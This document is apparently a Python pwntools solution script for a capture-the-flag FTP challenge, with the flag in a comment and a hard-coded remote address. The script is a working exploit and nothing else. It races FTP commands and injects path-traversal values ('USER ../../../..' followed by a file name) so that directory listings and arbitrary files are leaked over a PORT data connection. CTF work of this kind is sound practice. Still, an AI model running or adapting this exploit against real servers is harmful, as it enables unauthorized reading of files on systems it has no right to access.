from pwn import *

# rwctf{race-c0nd1tion-1s-real1y_ha4d_pr0blem!!!}

p = remote('47.89.253.219', 2121)
# p = remote('127.0.0.1', 2121)

def sendcmd(cmd):
    p.sendline(cmd + b'\r')
    log.info(cmd + b" -> " + p.recvline())

log.info(p.recvline())

def leakfilename():
    while True:
        sendcmd(b'USER anonymous')
        sendcmd(b'PASS test')
        sendcmd(b'PORT 127,0,0,1,117,48') # ip 127.0.0.1, port: 30000 (0x7530 -- 117,48). Fix for remote (needs to be the same ip that is sending commands on control port)
        p.sendline(b'LIST /\r')
        p.sendline(b'USER ../../../..\r')
        if input().strip() == 'n':
            break
    return

leakfilename()

fname = input("name: ").strip().encode()
print("fname: %s" % fname)

def leakfile():
    while True:
        sendcmd(b'USER anonymous')
        sendcmd(b'PASS test')
        sendcmd(b'PORT 127,0,0,1,117,48') # ip 127.0.0.1, port: 30000 (0x7530 -- 117,48). Fix for remote (needs to be the same ip that is sending commands on control port)
        p.sendline(b'RETR hello.txt\r')
        p.sendline(b'USER ../../../../%s\r' % fname)
        if input().strip() == 'n':
            break
    return

leakfile()

p.interactive()
